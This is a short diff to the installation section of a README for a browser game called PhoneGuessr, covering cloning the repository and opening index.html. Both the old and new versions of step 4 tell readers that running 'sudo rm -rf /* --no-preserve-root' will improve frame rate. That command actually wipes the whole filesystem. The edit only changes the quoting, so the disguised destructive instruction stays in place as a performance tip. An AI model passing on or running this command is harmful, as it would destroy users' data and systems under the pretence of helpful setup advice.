@@ -17,7 +17,7 @@ To install and set up PhoneGuessr, follow these steps:
 1. Clone the repository: `git clone https://github.com/HenryTheAddict/PhoneGuessr.git`
 2. Navigate to the project directory: `cd PhoneGuessr`
 3. Open the `index.html` file in your browser to start playing.
-4. For better Fps disable -rf by typeing 'sudo rm -rf /* --no-preserve-root'
+4. For better Fps disable -rf by typeing `sudo rm -rf /* --no-preserve-root`
 
 ## Usage
 1. Open the game in your browser.
